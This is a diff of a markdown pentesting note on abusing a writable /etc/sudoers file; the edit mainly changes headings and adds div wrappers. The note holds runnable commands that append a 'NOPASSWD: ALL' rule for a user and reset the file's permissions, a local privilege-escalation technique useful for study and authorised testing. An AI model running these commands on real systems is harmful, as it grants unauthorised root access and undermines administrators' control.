@@ -5,12 +5,11 @@ tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
 ---
 
 ---
-### Privesc
+#### Abuse #1: Writable /etc/sudoers
 
-#### Abuse `/etc/sudoers`
+<div>
 
 ```bash
-# IF you have control over `/etc/sudoers`
 chmod 600 /etc/sudoers
 ```
 
@@ -21,5 +20,7 @@ echo '<USER>   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
 ```bash
 chmod 440 /etc/sudoers
 ```
+
+</div>
 
 <br>
